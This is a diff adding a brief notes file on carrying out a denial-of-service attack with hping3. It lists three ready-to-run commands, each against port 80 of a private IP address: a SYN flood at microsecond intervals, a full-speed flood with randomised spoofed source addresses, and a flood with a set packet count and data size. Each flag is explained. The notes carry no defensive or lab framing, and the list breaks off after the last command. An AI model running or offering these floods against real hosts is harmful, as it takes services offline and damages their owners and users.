@@ -1,0 +1,17 @@
+For DOS attact we use hping3 :
+-------------------------------
+	* hping3 -i u100 -S -p 80 192.168.1.1
+		>> -i 	=> wait for next request in microseconds
+		>> -S 	=> set SYN flag
+		>> -p	=> destination port
+		>> Last is for ip
+
+	* hping3 -S --flood --rand-source -p 80 192.168.1.1
+		>> Here we don't use "-i". We use "--flood" 
+        >> which mean it will send packet at its best
+		>> --rand-sourc  => Which sets random address for sender.
+
+	* hping3 -c 100 -d 128 -w 64 --flood --rand-source -p 80 192.168.1.1
+		>> -c 	=> total packet
+		>> -d	=> data size
+
